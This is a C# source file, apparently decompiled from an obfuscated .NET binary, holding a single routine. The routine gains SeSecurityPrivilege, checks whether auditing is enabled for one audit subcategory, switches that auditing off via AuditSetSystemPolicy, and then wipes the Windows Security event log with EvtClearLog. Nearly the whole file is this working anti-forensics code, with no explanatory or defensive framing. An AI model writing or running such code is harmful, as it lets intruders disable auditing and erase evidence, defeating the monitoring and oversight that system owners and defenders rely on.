using System;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace ns0
{
	// Token: 0x02000003 RID: 3
	public static class GClass0
	{
		// Token: 0x06000006 RID: 6 RVA: 0x00005510 File Offset: 0x00003710
		public static bool smethod_0()
		{
			GClass0.smethod_5();
			GClass0.Struct0 @struct = GClass0.smethod_1();
			if (!GClass0.smethod_2(@struct.enum0_0))
			{
				return false;
			}
			GClass0.smethod_3(@struct.guid_1);
			GClass0.smethod_4();
			return true;
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00005548 File Offset: 0x00003748
		private static GClass0.Struct0 smethod_1()
		{
			Guid[] array = new Guid[] { GClass0.guid_0 };
			IntPtr intPtr;
			if (!GClass0.AuditQuerySystemPolicy(array, (uint)array.Length, out intPtr))
			{
				throw new Win32Exception(Marshal.GetLastWin32Error(), "AuditQuerySystemPolicy failed");
			}
			GClass0.Struct0 @struct;
			try
			{
				@struct = Marshal.PtrToStructure<GClass0.Struct0>(intPtr);
			}
			finally
			{
				GClass0.AuditFree(intPtr);
			}
			return @struct;
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002A83 File Offset: 0x00000C83
		private static bool smethod_2(GClass0.Enum0 enum0_0)
		{
			return (enum0_0 & (GClass0.Enum0.flag_1 | GClass0.Enum0.flag_2)) > GClass0.Enum0.flag_0;
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000055A8 File Offset: 0x000037A8
		private static void smethod_3(Guid guid_1)
		{
			GClass0.Struct0 @struct = new GClass0.Struct0
			{
				guid_0 = GClass0.guid_0,
				guid_1 = guid_1,
				enum0_0 = GClass0.Enum0.flag_3
			};
			if (!GClass0.AuditSetSystemPolicy(new GClass0.Struct0[] { @struct }, 1U))
			{
				throw new Win32Exception(Marshal.GetLastWin32Error(), "AuditSetSystemPolicy failed");
			}
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002A8B File Offset: 0x00000C8B
		private static void smethod_4()
		{
			if (!GClass0.EvtClearLog(IntPtr.Zero, "Security", null, 0))
			{
				throw new Win32Exception(Marshal.GetLastWin32Error(), "EvtClearLog(Security) failed");
			}
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00005604 File Offset: 0x00003804
		private static void smethod_5()
		{
			IntPtr intPtr;
			if (!GClass0.OpenProcessToken(GClass0.GetCurrentProcess(), 40U, out intPtr))
			{
				throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenProcessToken failed");
			}
			try
			{
				GClass0.Struct1 @struct;
				if (!GClass0.LookupPrivilegeValue(null, "SeSecurityPrivilege", out @struct))
				{
					throw new Win32Exception(Marshal.GetLastWin32Error(), "LookupPrivilegeValue failed");
				}
				GClass0.Struct3 struct2 = new GClass0.Struct3
				{
					uint_0 = 1U,
					struct2_0 = new GClass0.Struct2
					{
						struct1_0 = @struct,
						uint_0 = 2U
					}
				};
				if (!GClass0.AdjustTokenPrivileges(intPtr, false, ref struct2, 0, IntPtr.Zero, IntPtr.Zero))
				{
					throw new Win32Exception(Marshal.GetLastWin32Error(), "AdjustTokenPrivileges failed");
				}
			}
			finally
			{
				GClass0.CloseHandle(intPtr);
			}
		}

		// Token: 0x0600000C RID: 12
		[DllImport("advapi32.dll", SetLastError = true)]
		private static extern bool AuditQuerySystemPolicy([MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 1)] Guid[] guid_1, uint uint_3, out IntPtr intptr_0);

		// Token: 0x0600000D RID: 13
		[DllImport("advapi32.dll", SetLastError = true)]
		private static extern bool AuditSetSystemPolicy([In] GClass0.Struct0[] struct0_0, uint uint_3);

		// Token: 0x0600000E RID: 14
		[DllImport("advapi32.dll")]
		private static extern void AuditFree(IntPtr intptr_0);

		// Token: 0x0600000F RID: 15
		[DllImport("wevtapi.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		private static extern bool EvtClearLog(IntPtr intptr_0, string string_0, string string_1, int int_0);

		// Token: 0x06000010 RID: 16
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetCurrentProcess();

		// Token: 0x06000011 RID: 17
		[DllImport("advapi32.dll", SetLastError = true)]
		private static extern bool OpenProcessToken(IntPtr intptr_0, uint uint_3, out IntPtr intptr_1);

		// Token: 0x06000012 RID: 18
		[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		private static extern bool LookupPrivilegeValue(string string_0, string string_1, out GClass0.Struct1 struct1_0);

		// Token: 0x06000013 RID: 19
		[DllImport("advapi32.dll", SetLastError = true)]
		private static extern bool AdjustTokenPrivileges(IntPtr intptr_0, bool bool_0, ref GClass0.Struct3 struct3_0, int int_0, IntPtr intptr_1, IntPtr intptr_2);

		// Token: 0x06000014 RID: 20
		[DllImport("kernel32.dll")]
		private static extern bool CloseHandle(IntPtr intptr_0);

		// Token: 0x04000002 RID: 2
		private static readonly Guid guid_0 = new Guid("0CCE922B-69AE-11D9-BED3-505054503030");

		// Token: 0x04000003 RID: 3
		private const uint uint_0 = 8U;

		// Token: 0x04000004 RID: 4
		private const uint uint_1 = 32U;

		// Token: 0x04000005 RID: 5
		private const uint uint_2 = 2U;

		// Token: 0x02000004 RID: 4
		private struct Struct0
		{
			// Token: 0x04000006 RID: 6
			public Guid guid_0;

			// Token: 0x04000007 RID: 7
			public GClass0.Enum0 enum0_0;

			// Token: 0x04000008 RID: 8
			public Guid guid_1;
		}

		// Token: 0x02000005 RID: 5
		[Flags]
		private enum Enum0 : uint
		{
			// Token: 0x0400000A RID: 10
			flag_0 = 0U,
			// Token: 0x0400000B RID: 11
			flag_1 = 1U,
			// Token: 0x0400000C RID: 12
			flag_2 = 2U,
			// Token: 0x0400000D RID: 13
			flag_3 = 4U
		}

		// Token: 0x02000006 RID: 6
		private struct Struct1
		{
			// Token: 0x0400000E RID: 14
			public uint uint_0;

			// Token: 0x0400000F RID: 15
			public int int_0;
		}

		// Token: 0x02000007 RID: 7
		private struct Struct2
		{
			// Token: 0x04000010 RID: 16
			public GClass0.Struct1 struct1_0;

			// Token: 0x04000011 RID: 17
			public uint uint_0;
		}

		// Token: 0x02000008 RID: 8
		private struct Struct3
		{
			// Token: 0x04000012 RID: 18
			public uint uint_0;

			// Token: 0x04000013 RID: 19
			public GClass0.Struct2 struct2_0;
		}
	}
}
